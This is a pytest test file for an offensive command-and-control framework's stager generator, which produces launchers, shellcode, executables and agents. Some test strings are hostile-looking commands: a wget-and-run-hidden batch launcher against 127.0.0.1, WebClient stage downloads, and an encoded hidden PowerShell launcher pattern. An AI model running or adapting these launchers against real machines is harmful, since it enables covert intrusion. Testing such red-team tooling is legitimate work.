import base64
import concurrent.futures
import platform
import re
import subprocess
from pathlib import Path

import pytest

from empire.server.common import packets
from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleExecutionException
from empire.server.stagers.multi.generate_agent import Stager
from empire.server.utils.file_util import run_as_user

_MIN_GO_BUILD_ARGS = 2

is_arm = platform.machine().startswith("arm") or platform.machine().startswith(
    "aarch64"
)


@pytest.fixture(scope="module")
def stager_generation_service(main: MainMenu):
    return main.stagergenv2


def test_compiler(main, empire_config):
    dotnet_compiler = main.dotnet_compiler
    compiler_dir = dotnet_compiler.compiler_dir
    compiler_path = compiler_dir / "EmpireCompiler"

    assert compiler_path.is_file(), f"EmpireCompiler binary not found at {compiler_dir}"

    result = run_as_user([str(compiler_path), "--help"], text=True, capture_output=True)
    assert "Usage:" in result, "Unexpected output from EmpireCompiler --help"


def test_generate_launcher_fetcher(stager_generation_service):
    launcher = stager_generation_service.generate_launcher_fetcher(encode=False)

    assert (
        launcher
        == 'wget "http://127.0.0.1/launcher.bat" -outfile "launcher.bat"; Start-Process -FilePath .\\launcher.bat -Wait -passthru -WindowStyle Hidden;'
    )


def test_generate_launcher(stager_generation_service):
    pass


@pytest.mark.parametrize(
    ("obfuscate", "encode"),
    [
        (False, False),
        (False, True),
    ],
)
def test_generate_exe_oneliner(stager_generation_service, obfuscate, encode):
    launcher = stager_generation_service.generate_exe_oneliner(
        language="powershell",
        obfuscate=obfuscate,
        obfuscation_command="",
        encode=encode,
        listener_name="new-listener-1",
    )

    listener = stager_generation_service.listener_service.get_active_listener_by_name(
        "new-listener-1"
    )
    cookie_name = listener.options["Cookie"]["Value"]
    staging_key = listener.options["StagingKey"]["Value"]

    def decoded_powershell_if_needed(text: str) -> str:
        m = re.search(r"-enc\s+([A-Za-z0-9+/=]+)", text)
        if not m:
            return text
        raw = base64.b64decode(m.group(1))
        return raw.decode("utf-16le", errors="strict")

    ps = decoded_powershell_if_needed(launcher)

    # Invariants: the launcher should set the Cookie and download stage0
    assert "System.Net.WebClient" in ps
    assert 'Headers.Add("Cookie",' in ps
    assert "DownloadData(" in ps

    # Extract the cookie header value:  Cookie","<cookie_name>=<base64_routing_packet>"
    cookie_re = re.compile(
        r'Headers\.Add\("Cookie","' + re.escape(cookie_name) + r"=([^\";]+)\"\)"
    )
    m = cookie_re.search(ps)
    assert m, f"Cookie header not found or not in expected format. Script was: {ps}"

    b64_routing_packet = m.group(1)

    # Base64 must decode, and routing packet must be the expected invariant size here (encData is "")
    routing_packet = base64.b64decode(b64_routing_packet, validate=True)
    assert len(routing_packet) == 44  # noqa: PLR2004 12-byte nonce + 32-byte chacha20poly1305 blob

    # Decrypt + parse routing packet and validate invariant fields
    parsed = packets.parse_routing_packet(staging_key, routing_packet)
    assert parsed is not None
    assert "00000000" in parsed

    language, meta, additional, enc_data = parsed["00000000"]
    assert language == "POWERSHELL"
    assert meta == "STAGE0"
    assert additional == "NONE"
    assert enc_data == b""


@pytest.mark.parametrize(
    ("obfuscate", "encode"),
    [
        (True, False),
        (True, True),
    ],
)
@pytest.mark.slow
def test_obfuscate_generate_exe_oneliner(stager_generation_service, obfuscate, encode):
    launcher = stager_generation_service.generate_exe_oneliner(
        language="powershell",
        obfuscate=obfuscate,
        obfuscation_command="Token\\ALL\\1",
        encode=encode,
        listener_name="new-listener-1",
    )
    assert launcher is not None


def test_generate_dll(stager_generation_service):
    dll_bytes = stager_generation_service.generate_dll("posh_code", "x64")
    assert len(dll_bytes) == 665088  # noqa: PLR2004


@pytest.mark.parametrize(
    ("dot_net_version", "obfuscate"),
    [
        ("net40", False),
        ("net35", False),
        ("net40", True),
        ("net35", True),
    ],
)
@pytest.mark.slow
def test_generate_powershell_exe(stager_generation_service, dot_net_version, obfuscate):
    result = stager_generation_service.generate_powershell_exe(
        "posh_code", dot_net_version, obfuscate
    )

    assert result is not None
    assert result.exists(), f"Generated file not found: {result}"


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
        ("x86", "net35"),
        ("x64", "net35"),
        ("both", "net35"),
    ],
)
def test_generate_powershell_shellcode(
    stager_generation_service, arch, dot_net_version
):
    shellcode, err = stager_generation_service.generate_powershell_shellcode(
        "posh_code", arch, dot_net_version
    )

    assert err is None, f"Error occurred: {err}"
    assert isinstance(shellcode, bytes), (
        f"Shellcode should be bytes, but got {type(shellcode)}"
    )
    assert (
        len(shellcode) > 100  # noqa: PLR2004
    ), f"Shellcode is too short: {len(shellcode)} bytes"
    assert shellcode.startswith(b"\xe8"), (
        "Shellcode does not start with the expected byte"
    )
    assert re.search(rb"\x00\x00\x00\x00", shellcode), (
        "Expected byte sequence not found in shellcode"
    )


@pytest.mark.parametrize(
    ("dot_net_version", "obfuscate"),
    [
        ("net40", False),
        ("net40", True),
    ],
)
@pytest.mark.slow
def test_generate_python_exe(stager_generation_service, dot_net_version, obfuscate):
    result = stager_generation_service.generate_python_exe(
        "python_code", dot_net_version, obfuscate
    )

    assert result is not None
    assert result.exists(), f"Generated file not found: {result}"


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
    ],
)
def test_generate_python_shellcode(stager_generation_service, arch, dot_net_version):
    shellcode, err = stager_generation_service.generate_python_shellcode(
        "python_code", arch, dot_net_version
    )

    assert err is None, f"Unexpected error: {err}"
    assert shellcode is not None, "Shellcode was not generated"
    assert isinstance(shellcode, bytes), "Generated shellcode is not in bytes format"
    assert len(shellcode) > 0, "Generated shellcode is empty"


@pytest.mark.slow
def test_generate_go_stageless(stager_generation_service, tmp_path):
    """
    Test the generate_go_stageless function using a real listener (new-listener-1).
    Asserts the regex against the renderer's returned string instead of a
    global on-disk path.
    """
    install_path = stager_generation_service.main_menu.install_path
    static_main_go = install_path / "data/agent/gopire/main.go"
    assert not static_main_go.exists(), (
        f"test pollution: stale main.go in canonical install tree at {static_main_go}"
    )

    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    template_vars = stager_generation_service._build_template_vars(active_listener)

    compiler = stager_generation_service.main_menu.go_compiler
    rendered = compiler.generate_main_go(
        "main.template", str(tmp_path / "main.go"), template_vars
    )

    staging_key_base64_match = re.search(r'stagingKeyBase64\s*:=\s*"([^"]+)"', rendered)
    assert staging_key_base64_match, "stagingKeyBase64 not found in rendered main.go"

    staging_key = active_listener.options["StagingKey"]["Value"]
    expected_staging_key_base64 = base64.b64encode(staging_key.encode("UTF-8")).decode(
        "UTF-8"
    )
    assert staging_key_base64_match.group(1) == expected_staging_key_base64, (
        f"StagingKeyBase64 mismatch: expected {expected_staging_key_base64}, "
        f"got {staging_key_base64_match.group(1)}"
    )

    options = {"Listener": {"Value": "new-listener-1"}}
    result = stager_generation_service.generate_go_stageless(options)

    assert result is not None, "Stager generation failed, result is None."
    assert Path(result).exists(), f"Generated executable not found: {result}"
    assert Path(result).stat().st_size > 0, f"Generated executable is empty: {result}"


@pytest.mark.slow
def test_compile_stager_concurrent_isolation(stager_generation_service):
    """
    Concurrent compile_stager calls each produce a binary with their own
    staging key embedded — i.e. no cross-contamination from another in-flight
    build's main.go. This exercises the actual race the static-path fix targets:
    sequential calls would have passed under the buggy pre-fix code too because
    each call ran to completion before the next one started.
    """
    install_path = stager_generation_service.main_menu.install_path
    static_main_go = install_path / "data/agent/gopire/main.go"
    assert not static_main_go.exists(), (
        f"test pollution: stale main.go in canonical install tree at {static_main_go}"
    )

    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    base_template_vars = stager_generation_service._build_template_vars(active_listener)

    keys = [
        "AAAAAAAAAAAAAAAAAAAAAA==",
        "QkJCQkJCQkJCQkJCQkJCQkI=",
        "Q0NDQ0NDQ0NDQ0NDQ0NDQ0M=",
        "RERERERERERERERERERERFE=",
    ]
    template_vars_list = [{**base_template_vars, "STAGING_KEY": k} for k in keys]

    compiler = stager_generation_service.main_menu.go_compiler
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(keys)) as executor:
        futures = [
            executor.submit(compiler.compile_stager, tv, "stager", "windows", "amd64")
            for tv in template_vars_list
        ]
        binaries = [f.result() for f in futures]

    assert len(set(binaries)) == len(binaries), (
        f"compile_stager returned duplicate paths under concurrent calls: {binaries}"
    )

    for tv, binary_path in zip(template_vars_list, binaries, strict=True):
        assert Path(binary_path).exists(), f"Binary missing: {binary_path}"
        binary_bytes = Path(binary_path).read_bytes()
        expected = tv["STAGING_KEY"].encode("ascii")
        assert expected in binary_bytes, (
            f"Binary {binary_path} does not contain its expected staging key "
            f"{tv['STAGING_KEY']!r} — likely cross-contamination from another "
            f"concurrent compile_stager call"
        )

    assert not static_main_go.exists(), (
        f"compile_stager should not write main.go into the canonical install "
        f"tree, but it exists at {static_main_go}"
    )


@pytest.mark.slow
def test_compile_stager_preserves_main_go_on_build_failure(
    stager_generation_service, monkeypatch
):
    """
    When ``go build`` fails, the rendered main.go is preserved to a stable
    temp file referenced in the exception message and survives
    ``TemporaryDirectory`` cleanup so operators can inspect it post-mortem.
    """
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    template_vars = stager_generation_service._build_template_vars(active_listener)
    compiler = stager_generation_service.main_menu.go_compiler

    real_run = subprocess.run

    def fake_run(args, **kwargs):
        if (
            isinstance(args, list)
            and len(args) >= _MIN_GO_BUILD_ARGS
            and args[1] == "build"
        ):
            return subprocess.CompletedProcess(
                args=args, returncode=1, stdout="", stderr="forced build failure"
            )
        return real_run(args, **kwargs)

    monkeypatch.setattr("empire.server.core.go.subprocess.run", fake_run)

    with pytest.raises(ModuleExecutionException) as exc_info:
        compiler.compile_stager(template_vars, "stager", goos="windows", goarch="amd64")

    msg = str(exc_info.value)
    assert "forced build failure" in msg, f"build error must reach caller, got: {msg}"

    match = re.search(r"preserved at (\S+\.go)", msg)
    assert match, f"preserved path missing from exception message: {msg}"

    preserved = Path(match.group(1))
    try:
        assert preserved.exists(), f"preserved main.go does not exist: {preserved}"
        content = preserved.read_text()
        assert "stagingKeyBase64" in content, (
            "preserved file must contain rendered template content"
        )
    finally:
        preserved.unlink(missing_ok=True)


@pytest.mark.slow
def test_compile_stager_build_error_propagates_when_preservation_fails(
    stager_generation_service, monkeypatch
):
    """
    If preservation of the failed main.go itself fails (e.g. ENOSPC on /tmp),
    the original ``go build`` error must still reach the caller — preservation
    is a debugging aid and must never displace the real failure.
    """
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    template_vars = stager_generation_service._build_template_vars(active_listener)
    compiler = stager_generation_service.main_menu.go_compiler

    real_run = subprocess.run

    def fake_run(args, **kwargs):
        if (
            isinstance(args, list)
            and len(args) >= _MIN_GO_BUILD_ARGS
            and args[1] == "build"
        ):
            return subprocess.CompletedProcess(
                args=args, returncode=1, stdout="", stderr="forced build failure"
            )
        return real_run(args, **kwargs)

    def failing_mkstemp(*args, **kwargs):
        raise OSError(28, "No space left on device")

    monkeypatch.setattr("empire.server.core.go.subprocess.run", fake_run)
    monkeypatch.setattr("empire.server.core.go.tempfile.mkstemp", failing_mkstemp)

    with pytest.raises(ModuleExecutionException) as exc_info:
        compiler.compile_stager(template_vars, "stager", goos="windows", goarch="amd64")

    msg = str(exc_info.value)
    assert "forced build failure" in msg, (
        f"original build error must survive preservation failure, got: {msg}"
    )
    assert "failed to preserve" in msg, (
        f"failure-to-preserve note expected in message, got: {msg}"
    )


def test_build_template_vars(stager_generation_service):
    """`_build_template_vars` returns the same dict generate_go_stageless used to construct inline."""
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )

    template_vars = stager_generation_service._build_template_vars(active_listener)

    expected_keys = {
        "PROFILE",
        "HOST",
        "SESSION_ID",
        "KILL_DATE",
        "WORKING_HOURS",
        "DELAY",
        "JITTER",
        "LOST_LIMIT",
        "STAGING_KEY",
        "DEFAULT_RESPONSE",
        "AGENT_PRIVATE_CERT_KEY",
        "AGENT_PUBLIC_CERT_KEY",
        "SERVER_PUBLIC_CERT_KEY",
    }
    assert set(template_vars.keys()) == expected_keys
    assert template_vars["HOST"] == active_listener.host_address
    assert template_vars["SESSION_ID"] == "00000000"

    expected_staging_key = base64.b64encode(
        active_listener.options["StagingKey"]["Value"].encode("UTF-8")
    ).decode("UTF-8")
    assert template_vars["STAGING_KEY"] == expected_staging_key


@pytest.mark.slow
def test_generate_main_go_returns_rendered_string(stager_generation_service, tmp_path):
    """generate_main_go returns the rendered string in addition to writing it."""
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    template_vars = stager_generation_service._build_template_vars(active_listener)

    compiler = stager_generation_service.main_menu.go_compiler
    output_path = tmp_path / "main.go"

    rendered = compiler.generate_main_go(
        "main.template", str(output_path), template_vars
    )

    assert isinstance(rendered, str), "generate_main_go must return the rendered string"
    assert rendered == output_path.read_text(), (
        "Returned string must match the bytes written to disk"
    )
    assert "stagingKeyBase64" in rendered, "Render did not produce expected content"


@pytest.mark.parametrize(
    ("language", "listener_name", "obfuscate", "encode", "expected_partial_launcher"),
    [
        (
            "go",
            "new-listener-1",
            False,
            False,
            r'\$tempFilePath = \[System.IO.Path\]::Combine\(\[System.IO.Path\]::GetTempPath\(\), "[\w\d]+\.exe"\);',
        ),
        (
            "go",
            "new-listener-1",
            True,
            False,
            None,
        ),
        (
            "go",
            "new-listener-1",
            False,
            True,
            None,
        ),
    ],
)
def test_generate_go_exe_oneliner(
    stager_generation_service,
    language,
    listener_name,
    obfuscate,
    encode,
    expected_partial_launcher,
):
    launcher = stager_generation_service.generate_go_exe_oneliner(
        language=language,
        listener_name=listener_name,
        obfuscate=obfuscate,
        obfuscation_command="Token\\ALL\\1" if obfuscate else "",
        encode=encode,
    )

    assert launcher is not None, "Launcher generation failed, result is None."

    if not obfuscate and not encode:
        assert re.search(expected_partial_launcher, launcher), (
            f"Launcher does not contain expected content: {launcher}"
        )

    if obfuscate or encode:
        # Check if launcher is a string
        assert isinstance(launcher, str), (
            f"Expected launcher to be a string, but got {type(launcher)}."
        )

        # Check if launcher has a non-zero length
        assert len(launcher) > 0, "Launcher is empty; expected non-empty string."

    if encode:
        assert re.match(
            r"powershell -noP -sta -w 1 -enc\s+[A-Za-z0-9+/=]+",
            launcher,
        ), f"Encoded launcher does not match expected structure: {launcher}"


def test_generate_dylib(stager_generation_service):
    """
    Tests the generate_dylib function to ensure it creates a dylib with an embedded launcher code.
    """
    launcher_code = "import os; print('Hello, World!')"
    arch = "x64"
    hijacker = "false"

    result = stager_generation_service.generate_dylib(launcher_code, arch, hijacker)

    assert result is not None, "generate_dylib returned None"
    assert len(result) > 9000  # noqa: PLR2004


def test_generate_appbundle(stager_generation_service):
    launcher_code = "import os; print('Hello, World!')"
    arch = "x64"
    icon = ""
    app_name = ""
    disarm = False

    result = stager_generation_service.generate_appbundle(
        launcher_code, arch, icon, app_name, disarm
    )

    assert result is not None, "generate_appbundle returned None"
    assert len(result) > 9000  # noqa: PLR2004


@pytest.mark.slow
def test_generate_jar(stager_generation_service):
    launcher_code = "import os; print('Hello, World!')"
    result = stager_generation_service.generate_jar(launcher_code)

    assert result is not None, "generate_jar returned None"
    assert len(result) > 1000  # noqa: PLR2004


@pytest.mark.parametrize(
    ("language", "expected_substrings"),
    [
        ("python", ["def run(", "server=", "class Stage"]),
        ("ironpython", ["def run(", "server=", "class Stage"]),
        (
            "powershell",
            [
                "function Invoke-Empire {",
                "function Start-Negotiate {",
                '$ErrorActionPreference = "SilentlyContinue"',
            ],
        ),
    ],
)
def test_generate_stageless(stager_generation_service, language, expected_substrings):
    """
    Test the generate_stageless function for different supported languages.
    """
    options = {
        "Listener": {"Value": "new-listener-1"},
        "Language": {"Value": language},
    }

    result = stager_generation_service.generate_stageless(options)

    assert result is not None, f"Stageless agent generation failed for {language}."
    assert isinstance(result, str), (
        f"Generated stageless agent for {language} should be a string."
    )

    for substring in expected_substrings:
        assert substring in result, (
            f"Expected '{substring}' in the generated {language} agent."
        )


def test_generate_upload(stager_generation_service):
    pass


def test_multi_generate_agent_stageless_powershell(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = "False"

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "function Invoke-Empire {" in result
    assert "function Start-Negotiate {" in result
    assert '$ErrorActionPreference = "SilentlyContinue"' in result


def test_multi_generate_agent_staged_powershell(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = "True"

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "function Invoke-Empire {" not in result
    assert "DownloadData(" in result or "WebClient" in result


def test_multi_generate_agent_stageless_python(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "python"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = "False"

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "def run(" in result
    assert "class Stage" in result


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
        ("x86", "net35"),
        ("x64", "net35"),
        ("both", "net35"),
    ],
)
def test_generate_csharp_shellcode(stager_generation_service, arch, dot_net_version):
    shellcode, err = stager_generation_service.generate_csharp_shellcode(
        listener_name="new-listener-1",
        arch=arch,
        dot_net_version=dot_net_version,
    )

    assert err is None, f"Error occurred: {err}"
    assert isinstance(shellcode, bytes), (
        f"Shellcode should be bytes, but got {type(shellcode)}"
    )
    assert len(shellcode) > 100, f"Shellcode is too short: {len(shellcode)} bytes"  # noqa: PLR2004


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    "language",
    [
        "powershell",
        "csharp",
    ],
)
def test_generate_shellcode(stager_generation_service, language):
    shellcode, err = stager_generation_service.generate_shellcode(
        language=language,
        listener_name="new-listener-1",
    )

    assert err is None, f"Error occurred: {err}"
    assert isinstance(shellcode, bytes), (
        f"Shellcode should be bytes, but got {type(shellcode)}"
    )
    assert len(shellcode) > 100, f"Shellcode is too short: {len(shellcode)} bytes"  # noqa: PLR2004
